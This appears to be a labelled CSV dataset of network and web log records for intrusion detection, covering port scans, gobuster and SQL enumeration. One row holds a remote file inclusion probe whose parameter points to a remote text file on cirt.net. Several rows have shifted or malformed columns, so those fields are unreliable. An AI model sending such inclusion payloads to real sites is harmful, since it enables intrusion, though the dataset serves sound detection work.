@timestamp,src_ip,src_port,dst_ip,dst_port,Protocol,http_request_method,http_request_referrer,http_response_code,url_path,user_agent_original,sql_method,sql_query,category,label_
1666541395,127.0.0.1,52587,127.0.0.1,49694,2022-10-24 00:09:28 ALLOW TCP 127.0.0.1 127.0.0.1 52587 49694 0 - 0 0 0 - - - SEND 14520,TCP,0,0,0,0,0,0,port_scan,3
1666691995,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666690178,192.168.34.11,53114,192.168.33.12,0,HTTP,0,0,0,/community/member.php,0,0,0,web_enumeration,2
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1664373920,192.168.91.15,63014,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666692145,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666542072,0,53472,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666692055,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691985,10.32.4.176,52870,10.132.100.53,1110,TCP,0,0,0,0,0,0,0,port_scan,0
1666590957,10.0.0.20,33518,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'WPLANG' LIMIT 1,sql_enumeration,0
1666582469,192.168.207.142,0,0,0,HTTPS,GET,0,404,/horde/test.php,Mozilla/5.00,0,0,web_enumeration,1
1666542079,192.168.106.1,50796,192.168.106.130,53,2022-10-24 00:20:58 ALLOW UDP 192.168.106.1 192.168.106.130 50796 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666591469,0,0,10.0.0.22,5044,0,0,0,0,0,0,0,0,sql_enumeration,0
1666712777, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/sections,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666582478,192.168.207.142,0,0,0,HTTPS,GET,0,404,/classes/Auth/OpenID/FileStore.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666691983,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
